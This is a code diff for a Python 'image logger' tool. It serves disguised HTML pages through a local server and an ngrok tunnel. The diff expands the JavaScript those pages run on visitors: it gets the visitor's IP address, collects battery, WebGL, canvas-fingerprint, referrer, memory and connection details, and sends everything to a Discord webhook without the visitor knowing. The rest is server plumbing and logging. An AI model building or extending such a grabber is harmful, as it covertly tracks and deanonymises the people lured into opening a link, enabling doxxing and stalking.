@@ -20,19 +20,34 @@ class LocalHTTPServer:
         self.server = None
         self.server_thread = None
         self.base_url = f"http://localhost:{port}"
+        # Store the absolute path to generated_images directory
+        self.generated_images_path = os.path.abspath("generated_images")
     
     def start_server(self):
         """Start the local HTTP server"""
         try:
             # Create server with custom handler
-            self.server = HTTPServer(('localhost', self.port), self.CustomHTTPRequestHandler)
+            self.server = HTTPServer(('0.0.0.0', self.port), self.CustomHTTPRequestHandler)
             
             # Start server in a separate thread
             self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
             self.server_thread.start()
             
-            print(f"{Fore.GREEN}[+] Local server started at {self.base_url}")
-            return True
+            # Wait for server to start
+            time.sleep(1)
+            
+            # Test if server is actually running
+            try:
+                import requests
+                response = requests.get(f"http://localhost:{self.port}", timeout=3)
+                print(f"{Fore.GREEN}[+] Local server started at {self.base_url}")
+                print(f"{Fore.CYAN}[*] Server is listening on all interfaces (0.0.0.0:{self.port})")
+                print(f"{Fore.CYAN}[*] Server test successful: {response.status_code}")
+                return True
+            except Exception as e:
+                print(f"{Fore.YELLOW}[!] Server started but test failed: {e}")
+                print(f"{Fore.CYAN}[*] Server might still work with ngrok")
+                return True
             
         except Exception as e:
             print(f"{Fore.RED}[!] Failed to start local server: {e}")
@@ -42,8 +57,9 @@ class LocalHTTPServer:
         """Custom HTTP request handler that serves files from generated_images directory"""
         
         def __init__(self, *args, **kwargs):
-            # Set the directory to serve from
-            self.directory = "generated_images"
+            # Get the generated_images path from the server instance
+            self.generated_images_path = os.path.abspath("generated_images")
+            print(f"{Fore.CYAN}[HTTP] Server initialized with path: {self.generated_images_path}")
             super().__init__(*args, **kwargs)
         
         def translate_path(self, path):
@@ -55,10 +71,63 @@ class LocalHTTPServer:
             if not path:
                 path = "index.html"
             
-            # Construct full path
-            full_path = os.path.join(os.getcwd(), "generated_images", path)
+            # Construct full path using the stored generated_images_path
+            full_path = os.path.join(self.generated_images_path, path)
+            
+            # Debug: print the path translation
+            print(f"{Fore.CYAN}[HTTP] Path translation: '{self.path}' -> '{full_path}'")
+            
+            # Ensure the path is within the generated_images directory for security
+            if not os.path.abspath(full_path).startswith(self.generated_images_path):
+                print(f"{Fore.RED}[HTTP] Security check failed: {full_path}")
+                return os.path.join(self.generated_images_path, "index.html")
             
             return full_path
+        
+        def do_GET(self):
+            """Handle GET requests"""
+            try:
+                # Handle favicon.ico requests
+                if self.path == '/favicon.ico':
+                    print(f"{Fore.CYAN}[HTTP] Favicon request, sending 204 No Content")
+                    self.send_response(204)
+                    self.end_headers()
+                    return
+                
+                # Get the file path
+                file_path = self.translate_path(self.path)
+                
+                # Check if file exists
+                if not os.path.exists(file_path):
+                    print(f"{Fore.RED}[HTTP] File not found: {file_path}")
+                    # Try to list directory contents for debugging
+                    if os.path.exists(self.generated_images_path):
+                        files = os.listdir(self.generated_images_path)
+                        print(f"{Fore.YELLOW}[HTTP] Available files: {files[:5]}...")  # Show first 5 files
+                    self.send_error(404, "File not found")
+                    return
+                
+                # Serve the file
+                print(f"{Fore.GREEN}[HTTP] Serving: {self.path} -> {file_path}")
+                super().do_GET()
+                
+            except Exception as e:
+                error_msg = str(e)
+                if "10053" in error_msg or "ConnectionAbortedError" in error_msg:
+                    print(f"{Fore.YELLOW}[HTTP] Connection aborted by client: {self.path}")
+                    # Don't send error response, connection is already closed
+                    return
+                else:
+                    print(f"{Fore.RED}[HTTP] Error serving {self.path}: {e}")
+                    try:
+                        self.send_error(500, "Internal server error")
+                    except:
+                        # Connection might be closed, ignore
+                        pass
+        
+        def log_message(self, format, *args):
+            """Override to provide better logging"""
+            print(f"{Fore.CYAN}[HTTP] {format % args}")
     
     def stop_server(self):
         """Stop the local HTTP server"""
@@ -76,6 +145,7 @@ class ImageLoggerEnhanced:
         self.output_dir = "generated_images"
         self.hosting_option = None
         self.local_server = None
+        self.ngrok_tunnel_type = 'http' # Default to HTTP tunnel
         
         # Create output directory
         self.create_output_directory()
@@ -212,8 +282,28 @@ class ImageLoggerEnhanced:
             language: navigator.language,
             platform: navigator.platform,
             screenResolution: screen.width + "x" + screen.height,
+            colorDepth: screen.colorDepth + " bit",
+            pixelDepth: screen.pixelDepth + " bit",
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer || "Direct access",
+            url: window.location.href,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            onLine: navigator.onLine,
+            javaEnabled: navigator.javaEnabled(),
+            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+            deviceMemory: navigator.deviceMemory || "Unknown",
+            maxTouchPoints: navigator.maxTouchPoints || "Unknown",
+            connection: navigator.connection ? {{
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            }} : "Unknown",
+            battery: null,
+            geolocation: null,
+            webgl: null,
+            canvas: null
         }};
         
         // Send data to Discord webhook
@@ -246,6 +336,11 @@ class ImageLoggerEnhanced:
                                     inline: true
                                 }},
                                 {{
+                                    name: "🎨 Color Depth",
+                                    value: userInfo.colorDepth,
+                                    inline: true
+                                }},
+                                {{
                                     name: "🌍 Language",
                                     value: userInfo.language,
                                     inline: true
@@ -256,6 +351,31 @@ class ImageLoggerEnhanced:
                                     inline: true
                                 }},
                                 {{
+                                    name: "🔗 Referrer",
+                                    value: userInfo.referrer,
+                                    inline: true
+                                }},
+                                {{
+                                    name: "🍪 Cookies Enabled",
+                                    value: userInfo.cookiesEnabled ? "Yes" : "No",
+                                    inline: true
+                                }},
+                                {{
+                                    name: "🖥️ Hardware Concurrency",
+                                    value: userInfo.hardwareConcurrency,
+                                    inline: true
+                                }},
+                                {{
+                                    name: "💾 Device Memory",
+                                    value: userInfo.deviceMemory + " GB",
+                                    inline: true
+                                }},
+                                {{
+                                    name: "📱 Max Touch Points",
+                                    value: userInfo.maxTouchPoints,
+                                    inline: true
+                                }},
+                                {{
                                     name: "📅 Timestamp",
                                     value: userInfo.timestamp,
                                     inline: true
@@ -263,6 +383,27 @@ class ImageLoggerEnhanced:
                                 {{
                                     name: "🔍 User Agent",
                                     value: userInfo.userAgent,
+                                    inline: false
+                                }},
+                                {{
+                                    name: "🌐 Connection Info",
+                                    value: typeof userInfo.connection === 'object' ? 
+                                        `Type: ${{userInfo.connection.effectiveType}}, Speed: ${{userInfo.connection.downlink}}Mbps, RTT: ${{userInfo.connection.rtt}}ms` : 
+                                        "Unknown",
+                                    inline: false
+                                    }},
+                                {{
+                                    name: "🔋 Battery Info",
+                                    value: typeof userInfo.battery === 'object' ? 
+                                        `Level: ${{userInfo.battery.level}}, Charging: ${{userInfo.battery.charging ? 'Yes' : 'No'}}` : 
+                                        userInfo.battery,
+                                    inline: true
+                                }},
+                                {{
+                                    name: "🎮 WebGL Info",
+                                    value: typeof userInfo.webgl === 'object' ? 
+                                        `Vendor: ${{userInfo.webgl.vendor}}, Renderer: ${{userInfo.webgl.renderer}}` : 
+                                        userInfo.webgl,
                                     inline: false
                                 }}
                             ],
@@ -283,12 +424,70 @@ class ImageLoggerEnhanced:
             }}
         }}
         
+        // Get battery information
+        async function getBatteryInfo() {{
+            if ('getBattery' in navigator) {{
+                try {{
+                    const battery = await navigator.getBattery();
+                    userInfo.battery = {{
+                        level: Math.round(battery.level * 100) + "%",
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    }};
+                }} catch (error) {{
+                    userInfo.battery = "Not available";
+                }}
+            }} else {{
+                userInfo.battery = "Not supported";
+            }}
+        }}
+        
+        // Get WebGL information
+        function getWebGLInfo() {{
+            try {{
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {{
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    userInfo.webgl = {{
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown",
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown"
+                    }};
+                }} else {{
+                    userInfo.webgl = "Not supported";
+                }}
+            }} catch (error) {{
+                userInfo.webgl = "Error getting WebGL info";
+            }}
+        }}
+        
+        // Get canvas fingerprint
+        function getCanvasFingerprint() {{
+            try {{
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillText("Canvas fingerprint", 2, 2);
+                userInfo.canvas = canvas.toDataURL();
+            }} catch (error) {{
+                userInfo.canvas = "Error generating canvas fingerprint";
+            }}
+        }}
+        
         // Get IP address and send data
         async function getIPAndSend() {{
             try {{
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userInfo.ip = data.ip;
+                
+                // Get additional system information
+                await getBatteryInfo();
+                getWebGLInfo();
+                getCanvasFingerprint();
+                
                 await sendToDiscord();
             }} catch (error) {{
                 userInfo.ip = "Unknown";
@@ -321,18 +520,54 @@ class ImageLoggerEnhanced:
         """Setup local HTTP server"""
         print(f"{Fore.CYAN}[*] Setting up local HTTP server...")
         
-        # Change working directory to generated_images for the server
-        original_dir = os.getcwd()
-        os.chdir(self.output_dir)
+        # Create index.html file for root requests
+        index_file = os.path.join(self.output_dir, "index.html")
+        index_content = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Logger Server</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .file-list { background: #f5f5f5; padding: 20px; border-radius: 5px; }
+        .file-item { margin: 5px 0; }
+        a { color: #0066cc; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🖼️ Image Logger Server</h1>
+        <p>Server is running. Available files:</p>
+        <div class="file-list">
+            <div class="file-item">📄 <a href="/test.html">test.html</a> - Test file</div>
+            <div class="file-item">📄 <a href="/piska_dqACCgjx.html">piska_dqACCgjx.html</a> - Image logger</div>
+            <div class="file-item">📄 <a href="/piska_AhXAGYxG.html">piska_AhXAGYxG.html</a> - Image logger</div>
+            <div class="file-item">📄 <a href="/piska_LcJDMxrM.html">piska_LcJDMxrM.html</a> - Image logger</div>
+        </div>
+        <p><small>Use specific image URLs to access files.</small></p>
+    </div>
+</body>
+</html>"""
+        
+        with open(index_file, 'w', encoding='utf-8') as f:
+            f.write(index_content)
+        print(f"{Fore.GREEN}[+] Created index.html")
         
         self.local_server = LocalHTTPServer()
         if self.local_server.start_server():
-            # Restore original directory
-            os.chdir(original_dir)
+            # Test if server is actually working
+            try:
+                import requests
+                response = requests.get("http://localhost:8080", timeout=3)
+                print(f"{Fore.GREEN}[+] Server test successful: {response.status_code}")
+            except Exception as e:
+                print(f"{Fore.YELLOW}[!] Server test failed: {e}")
+                print(f"{Fore.CYAN}[*] Server might still work with ngrok")
+            
             return self.local_server.base_url
         else:
-            # Restore original directory
-            os.chdir(original_dir)
             return None
     
     def setup_ngrok_tunnel(self):
@@ -449,7 +684,7 @@ class ImageLoggerEnhanced:
                     tunnels = response.json()['tunnels']
                     if tunnels:
                         public_url = tunnels[0]['public_url']
-                        print(f"{Fore.GREEN}[+] ngrok tunnel created: {public_url}")
+                        print(f"{Fore.GREEN}[+] ngrok HTTP tunnel created: {public_url}")
                         return public_url
             except:
                 pass
